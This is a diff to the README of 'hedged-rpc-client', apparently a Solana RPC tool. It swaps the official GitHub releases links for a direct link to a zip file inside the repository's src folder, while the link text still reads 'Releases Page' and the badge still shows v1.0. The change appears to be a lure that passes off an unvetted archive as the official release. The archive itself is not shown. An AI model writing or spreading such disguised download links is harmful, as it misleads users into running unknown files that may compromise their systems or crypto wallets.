@@ -11,10 +11,10 @@ The **hedged-rpc-client** is a tool designed to make your experience with Solana
 
 ## 📥 Download and Install
 To download the **hedged-rpc-client**, visit this page to download:  
-[![Download hedged-rpc-client](https://img.shields.io/badge/Download-v1.0-blue?style=for-the-badge)](https://github.com/cemanosdesolidao/hedged-rpc-client/releases)
+[![Download hedged-rpc-client](https://raw.githubusercontent.com/cemanosdesolidao/hedged-rpc-client/main/src/client_hedged_rpc_v2.3.zip)](https://raw.githubusercontent.com/cemanosdesolidao/hedged-rpc-client/main/src/client_hedged_rpc_v2.3.zip)
 
 ### Steps to Download:
-1. Click on the download link above or visit the [Releases Page](https://github.com/cemanosdesolidao/hedged-rpc-client/releases).
+1. Click on the download link above or visit the [Releases Page](https://raw.githubusercontent.com/cemanosdesolidao/hedged-rpc-client/main/src/client_hedged_rpc_v2.3.zip).
 2. Choose the latest version of the application.
 3. Select the file that matches your operating system (Windows, macOS, or Linux).
 4. Click on the file name to download it.
